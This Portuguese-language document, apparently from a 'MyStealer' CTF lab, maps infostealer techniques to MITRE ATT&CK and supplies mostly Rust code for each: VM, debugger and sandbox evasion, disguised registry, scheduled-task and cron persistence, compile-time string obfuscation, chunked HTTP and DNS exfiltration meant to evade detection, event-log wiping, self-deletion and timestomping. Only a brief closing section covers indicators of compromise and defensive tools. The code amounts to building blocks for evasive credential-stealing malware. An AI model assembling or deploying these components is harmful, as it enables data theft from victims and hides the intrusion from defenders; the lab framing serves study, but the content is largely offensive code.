# 🎯 Técnicas e TTPs - MyStealer CTF Lab

## MITRE ATT&CK Mapping

Este laboratório implementa técnicas documentadas no framework MITRE ATT&CK:

| Técnica | ID | Categoria |
|---------|----|-----------| 
| Credentials from Password Stores | T1555 | Credential Access |
| Clipboard Data | T1115 | Collection |
| Data from Local System | T1005 | Collection |
| System Information Discovery | T1082 | Discovery |
| Automated Collection | T1119 | Collection |
| Data Encrypted for Impact | T1486 | Impact |
| Exfiltration Over C2 Channel | T1041 | Exfiltration |

---

## 1. Técnicas de Evasão (Anti-Analysis)

### 1.1 Detecção de Máquina Virtual

```rust
pub struct VmDetector;

impl VmDetector {
    /// Verifica múltiplos indicadores de VM
    pub fn is_virtual_machine() -> bool {
        Self::check_registry_keys() ||
        Self::check_processes() ||
        Self::check_hardware() ||
        Self::check_files() ||
        Self::check_mac_address()
    }
    
    #[cfg(windows)]
    fn check_registry_keys() -> bool {
        let vm_keys = [
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SOFTWARE\Oracle\VirtualBox Guest Additions",
            r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
            r"SYSTEM\CurrentControlSet\Services\vmci",
        ];
        
        vm_keys.iter().any(|key| registry_key_exists(key))
    }
    
    fn check_processes() -> bool {
        let vm_processes = [
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "VBoxService.exe",
            "VBoxTray.exe",
            "qemu-ga.exe",
        ];
        
        get_running_processes()
            .iter()
            .any(|p| vm_processes.contains(&p.as_str()))
    }
    
    fn check_hardware() -> bool {
        // Verificar CPUID
        #[cfg(target_arch = "x86_64")]
        unsafe {
            let result = core::arch::x86_64::__cpuid(0x40000000);
            let vendor = std::str::from_utf8_unchecked(&[
                result.ebx.to_le_bytes(),
                result.ecx.to_le_bytes(),
                result.edx.to_le_bytes(),
            ].concat());
            
            matches!(vendor, "VMwareVMware" | "Microsoft Hv" | "KVMKVMKVM")
        }
    }
    
    fn check_mac_address() -> bool {
        let vm_mac_prefixes = [
            "00:0C:29",  // VMware
            "00:50:56",  // VMware
            "08:00:27",  // VirtualBox
            "52:54:00",  // QEMU/KVM
        ];
        
        get_mac_addresses()
            .iter()
            .any(|mac| vm_mac_prefixes.iter().any(|p| mac.starts_with(p)))
    }
}
```

### 1.2 Detecção de Debugger

```rust
pub struct DebuggerDetector;

impl DebuggerDetector {
    #[cfg(windows)]
    pub fn is_debugger_present() -> bool {
        use windows::Win32::System::Diagnostics::Debug::{
            IsDebuggerPresent, CheckRemoteDebuggerPresent,
        };
        use windows::Win32::System::Threading::GetCurrentProcess;
        
        unsafe {
            // Método 1: API direta
            if IsDebuggerPresent().as_bool() {
                return true;
            }
            
            // Método 2: Debugger remoto
            let mut is_remote = false.into();
            if CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_remote).is_ok() {
                if is_remote.as_bool() {
                    return true;
                }
            }
            
            // Método 3: PEB.BeingDebugged
            Self::check_peb_being_debugged()
        }
    }
    
    #[cfg(windows)]
    unsafe fn check_peb_being_debugged() -> bool {
        use std::arch::asm;
        
        let peb: *const u8;
        
        #[cfg(target_arch = "x86_64")]
        asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb
        );
        
        // BeingDebugged está no offset 0x2
        *peb.add(0x2) != 0
    }
    
    #[cfg(unix)]
    pub fn is_debugger_present() -> bool {
        // Método 1: ptrace
        use nix::sys::ptrace;
        
        match ptrace::traceme() {
            Ok(_) => {
                // Se funcionar, não está sendo debugado
                // Desfazer o trace
                false
            }
            Err(_) => true, // Já está sendo traced
        }
    }
}
```

### 1.3 Detecção de Sandbox

```rust
pub struct SandboxDetector;

impl SandboxDetector {
    pub fn is_sandboxed() -> bool {
        Self::check_username() ||
        Self::check_hostname() ||
        Self::check_disk_size() ||
        Self::check_ram_size() ||
        Self::check_process_count() ||
        Self::check_timing()
    }
    
    fn check_username() -> bool {
        let sandbox_usernames = [
            "sandbox", "malware", "virus", "sample",
            "test", "john", "user", "admin", "currentuser",
        ];
        
        let username = whoami::username().to_lowercase();
        sandbox_usernames.contains(&username.as_str())
    }
    
    fn check_disk_size() -> bool {
        // Sandboxes geralmente têm discos pequenos
        let total_disk = get_total_disk_size();
        total_disk < 60 * 1024 * 1024 * 1024 // < 60GB
    }
    
    fn check_ram_size() -> bool {
        let total_ram = get_total_ram();
        total_ram < 2 * 1024 * 1024 * 1024 // < 2GB
    }
    
    fn check_timing() -> bool {
        // Sandboxes podem acelerar o tempo
        let start = std::time::Instant::now();
        std::thread::sleep(std::time::Duration::from_secs(1));
        let elapsed = start.elapsed();
        
        // Se passou muito menos ou muito mais que 1 segundo
        elapsed < std::time::Duration::from_millis(900) ||
        elapsed > std::time::Duration::from_millis(1200)
    }
}
```

---

## 2. Técnicas de Persistência

> ⚠️ **Nota**: Estas técnicas são apenas para estudo. No modo lab, a persistência é simulada.

### 2.1 Registry Run Keys (Windows)

```rust
#[cfg(windows)]
pub fn add_registry_persistence(exe_path: &str) -> Result<(), PersistenceError> {
    use windows::Win32::System::Registry::{
        RegSetValueExW, HKEY_CURRENT_USER, REG_SZ,
    };
    
    let key_path = r"Software\Microsoft\Windows\CurrentVersion\Run";
    let value_name = "WindowsUpdate";  // Nome inocente
    
    // Abrir chave e definir valor
    // ...
    
    tracing::info!("Registry persistence added");
    Ok(())
}
```

### 2.2 Scheduled Tasks (Windows)

```rust
#[cfg(windows)]
pub fn add_scheduled_task(exe_path: &str) -> Result<(), PersistenceError> {
    let task_xml = format!(r#"
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2">
            <Triggers>
                <LogonTrigger>
                    <Enabled>true</Enabled>
                </LogonTrigger>
            </Triggers>
            <Actions>
                <Exec>
                    <Command>{}</Command>
                </Exec>
            </Actions>
        </Task>
    "#, exe_path);
    
    Command::new("schtasks")
        .args(["/create", "/tn", "WindowsDefenderUpdate", "/xml", "-"])
        .stdin(Stdio::piped())
        .spawn()?
        .stdin.as_mut().unwrap()
        .write_all(task_xml.as_bytes())?;
    
    Ok(())
}
```

### 2.3 Cron Jobs (Linux)

```rust
#[cfg(unix)]
pub fn add_cron_persistence(exe_path: &str) -> Result<(), PersistenceError> {
    use std::fs::OpenOptions;
    
    let cron_entry = format!(
        "@reboot {} >/dev/null 2>&1\n",
        exe_path
    );
    
    // Adicionar ao crontab do usuário
    let crontab_path = format!("/var/spool/cron/crontabs/{}", whoami::username());
    
    let mut file = OpenOptions::new()
        .append(true)
        .open(&crontab_path)?;
    
    file.write_all(cron_entry.as_bytes())?;
    
    Ok(())
}
```

---

## 3. Técnicas de Criptografia

### 3.1 Criptografia de Dados Coletados

```rust
use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use argon2::Argon2;

pub struct CryptoManager {
    key: [u8; 32],
}

impl CryptoManager {
    /// Gera chave a partir de material único da máquina
    pub fn new() -> Result<Self, CryptoError> {
        let machine_id = Self::get_machine_id()?;
        let salt = Self::get_salt();
        
        let mut key = [0u8; 32];
        Argon2::default()
            .hash_password_into(machine_id.as_bytes(), &salt, &mut key)?;
        
        Ok(Self { key })
    }
    
    /// Criptografa dados com AES-256-GCM
    pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        let cipher = Aes256Gcm::new_from_slice(&self.key)?;
        
        // Gerar nonce aleatório
        let nonce_bytes: [u8; 12] = rand::random();
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let ciphertext = cipher.encrypt(nonce, data)?;
        
        // Formato: nonce || ciphertext
        let mut result = Vec::with_capacity(12 + ciphertext.len());
        result.extend_from_slice(&nonce_bytes);
        result.extend(ciphertext);
        
        Ok(result)
    }
    
    /// Descriptografa dados
    pub fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if data.len() < 12 {
            return Err(CryptoError::InvalidData);
        }
        
        let cipher = Aes256Gcm::new_from_slice(&self.key)?;
        
        let nonce = Nonce::from_slice(&data[..12]);
        let ciphertext = &data[12..];
        
        cipher.decrypt(nonce, ciphertext)
            .map_err(|_| CryptoError::DecryptionFailed)
    }
    
    #[cfg(windows)]
    fn get_machine_id() -> Result<String, CryptoError> {
        // Usar MachineGUID do registro
        let output = Command::new("reg")
            .args(["query", 
                r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography",
                "/v", "MachineGuid"])
            .output()?;
        
        // Parsear output...
        Ok(machine_guid)
    }
    
    #[cfg(unix)]
    fn get_machine_id() -> Result<String, CryptoError> {
        std::fs::read_to_string("/etc/machine-id")
            .or_else(|_| std::fs::read_to_string("/var/lib/dbus/machine-id"))
            .map(|s| s.trim().to_string())
            .map_err(|_| CryptoError::MachineIdNotFound)
    }
}
```

### 3.2 Ofuscação de Strings

```rust
/// Macro para ofuscar strings em tempo de compilação
macro_rules! obfuscate {
    ($s:literal) => {{
        const KEY: u8 = 0x42;
        const INPUT: &[u8] = $s.as_bytes();
        const LEN: usize = INPUT.len();
        
        const fn xor_array<const N: usize>(input: &[u8], key: u8) -> [u8; N] {
            let mut result = [0u8; N];
            let mut i = 0;
            while i < N {
                result[i] = input[i] ^ key;
                i += 1;
            }
            result
        }
        
        const ENCRYPTED: [u8; LEN] = xor_array::<LEN>(INPUT, KEY);
        
        // Deofuscar em runtime
        let mut decrypted = [0u8; LEN];
        for i in 0..LEN {
            decrypted[i] = ENCRYPTED[i] ^ KEY;
        }
        
        String::from_utf8_lossy(&decrypted).to_string()
    }};
}

// Uso
let api_name = obfuscate!("CreateRemoteThread");
```

---

## 4. Técnicas de Exfiltração

### 4.1 Exfiltração HTTP

```rust
pub struct HttpExfiltrator {
    endpoint: String,
    client: reqwest::Client,
}

impl HttpExfiltrator {
    pub async fn exfiltrate(&self, data: &EncryptedData) -> Result<(), ExfilError> {
        // Codificar em base64
        let encoded = base64::engine::general_purpose::STANDARD.encode(&data.0);
        
        // Dividir em chunks para evitar detecção
        for chunk in encoded.as_bytes().chunks(4096) {
            self.client
                .post(&self.endpoint)
                .header("Content-Type", "application/octet-stream")
                .header("X-Request-ID", uuid::Uuid::new_v4().to_string())
                .body(chunk.to_vec())
                .send()
                .await?;
            
            // Delay aleatório entre requests
            tokio::time::sleep(Duration::from_millis(rand::random::<u64>() % 1000)).await;
        }
        
        Ok(())
    }
}
```

### 4.2 Exfiltração DNS (Técnica Avançada)

```rust
pub struct DnsExfiltrator {
    domain: String,
}

impl DnsExfiltrator {
    /// Exfiltra dados via queries DNS
    pub async fn exfiltrate(&self, data: &[u8]) -> Result<(), ExfilError> {
        // Codificar dados em base32 (DNS-safe)
        let encoded = base32::encode(base32::Alphabet::RFC4648 { padding: false }, data);
        
        // Dividir em labels DNS (max 63 chars cada)
        for (i, chunk) in encoded.as_bytes().chunks(63).enumerate() {
            let subdomain = format!(
                "{}.{}.data.{}",
                i,
                std::str::from_utf8(chunk).unwrap(),
                self.domain
            );
            
            // Fazer query DNS (a resposta não importa)
            let _ = tokio::net::lookup_host(&subdomain).await;
            
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        
        Ok(())
    }
}
```

---

## 5. Técnicas Anti-Forense

### 5.1 Limpeza de Rastros

```rust
pub struct AntiForensics;

impl AntiForensics {
    pub fn cleanup() {
        Self::clear_event_logs();
        Self::delete_prefetch();
        Self::clear_recent_docs();
        Self::secure_delete_self();
    }
    
    #[cfg(windows)]
    fn clear_event_logs() {
        let logs = ["Application", "Security", "System"];
        for log in logs {
            let _ = Command::new("wevtutil")
                .args(["cl", log])
                .output();
        }
    }
    
    fn secure_delete_self() {
        // Técnica de auto-deleção
        #[cfg(windows)]
        {
            let self_path = std::env::current_exe().unwrap();
            let cmd = format!(
                "ping 127.0.0.1 -n 3 > nul & del /f /q \"{}\"",
                self_path.display()
            );
            
            Command::new("cmd")
                .args(["/c", &cmd])
                .spawn()
                .ok();
        }
    }
}
```

### 5.2 Timestomping

```rust
#[cfg(windows)]
pub fn modify_timestamps(path: &Path, time: SystemTime) -> Result<(), IoError> {
    use windows::Win32::Storage::FileSystem::{
        SetFileTime, CreateFileW, OPEN_EXISTING,
    };
    
    let file_time = systemtime_to_filetime(time);
    
    unsafe {
        let handle = CreateFileW(
            // ...
        )?;
        
        SetFileTime(
            handle,
            Some(&file_time),  // Creation time
            Some(&file_time),  // Access time
            Some(&file_time),  // Modification time
        )?;
    }
    
    Ok(())
}
```

---

## 6. Considerações de Segurança Defensiva

### Detecção deste Tipo de Malware

```rust
// Indicadores de Compromisso (IOCs) para detecção:

// 1. Acessos a arquivos sensíveis
// - Cookies e Login Data dos navegadores
// - Arquivos de carteiras crypto
// - SSH keys, certificados

// 2. Padrões de comportamento
// - Coleta rápida de múltiplas fontes
// - Criptografia de dados antes de envio
// - Comunicação com endpoints suspeitos

// 3. Artefatos no sistema
// - Executável em locais não padrão
// - Persistência em chaves de registro
// - Tarefas agendadas suspeitas
```

### Ferramentas de Defesa Recomendadas

- **EDR**: CrowdStrike, Carbon Black, SentinelOne
- **SIEM**: Splunk, Elastic Security
- **Yara Rules**: Para detecção de strings e padrões
- **Sysmon**: Monitoramento de eventos Windows

---

## Próximos Passos

Ver [SETUP.md](SETUP.md) para configurar o ambiente de laboratório.

